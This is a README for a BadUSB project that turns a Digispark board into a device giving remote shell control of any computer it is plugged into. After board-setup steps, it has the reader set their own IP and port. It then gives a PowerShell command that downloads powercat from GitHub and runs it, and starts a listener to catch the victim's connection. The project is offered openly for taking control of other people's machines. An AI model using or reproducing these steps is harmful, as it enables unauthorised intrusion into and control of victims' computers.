BADUSB_PowerCat
===============
This Project is a gift for the 22th anniversary celebration of BY2HIT!  
![0](http://www.by2hit.net/wp-content/uploads/2015/05/logo.png) 

Make a BADUSB
-------------

1.Download the appropriate Arduino package at the Arduino.cc website: https://www.arduino.cc/en/Main/Software  
  
2.Download and install the drivers https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip  
  
3.Unzip and run “Install Drivers” (on 32bit systems) or “DPInst64” (on 64bit systems).  
  
4.In the Arduino application go to the “File” menu and select “Preferences”.  
  In the box labeled “Additional Boards Manager URLs” enter: http://digistump.com/package_digistump_index.json  
![1](http://digistump.com/wiki/_media/digispark/tutorials/entry.jpg)  
  
5.Go to the “Tools” menu and then the “Board” submenu - select “Boards Manager” and then from the type drop down select “Contributed”:  
  Select the “Digistump AVR Boards” package and click the “Install” button.  
![2](http://digistump.com//wiki/_media/digispark/tutorials/digispark_install.gif)  
  
6.Open BADUSB.ino change "127.0.0.1" into your IP and Change "443" into the port which you want to use. 
  
7.Upload it.  
  
8.Plug in Digispark.  
  
9.Now, the Digispark become the BADUSB.

Use it
------  

1.Open PowerShell  
  
2.Input"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')"  

3.Input"powercat -l -p 443" (Change "443" into the port which you set)  
  
4.Plug BADUSB in the computer which you want to control.  
  
5.Want a minute.
  
Done!